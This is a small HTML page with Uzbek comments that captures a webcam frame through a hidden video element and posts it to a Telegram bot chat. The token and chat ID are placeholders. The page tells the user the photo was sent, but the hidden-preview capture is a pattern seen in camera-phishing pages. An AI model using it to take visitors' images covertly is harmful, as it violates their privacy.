<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasmni Telegramga yuborish</title>
</head>
<body>
    <button id="startBtn">📸 Rasmga olish</button>
    <video id="video" width="300" height="250" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const startBtn = document.getElementById("startBtn");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const BOT_TOKEN = "SIZNING_BOT_TOKENINGIZ"; // O'zingizning bot tokeningizni kiriting
        const CHAT_ID = "SIZNING_CHAT_ID"; // Telegram ID yoki guruh ID

        // Kamera ishga tushirish va rasm olish
        async function takeAndSendPhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                // 1 soniya kutish (kamera ishga tushishi uchun)
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    sendPhotoToTelegram();
                }, 1000);
            } catch (error) {
                alert("Kamera ishga tushmadi: " + error);
            }
        }

        // Telegramga rasmni yuborish
        async function sendPhotoToTelegram() {
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "photo.jpg");

                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });
                    const result = await response.json();
                    console.log("Rasm yuborildi:", result);
                    alert("📤 Rasm Telegramga yuborildi!");

                    // Kamerani o'chirish
                    let tracks = video.srcObject.getTracks();
                    tracks.forEach(track => track.stop());
                    video.srcObject = null;
                } catch (error) {
                    console.error("Xatolik:", error);
                    alert("❌ Xatolik yuz berdi.");
                }
            }, "image/jpeg");
        }

        startBtn.addEventListener("click", takeAndSendPhoto);
    </script>
</body>
</html>
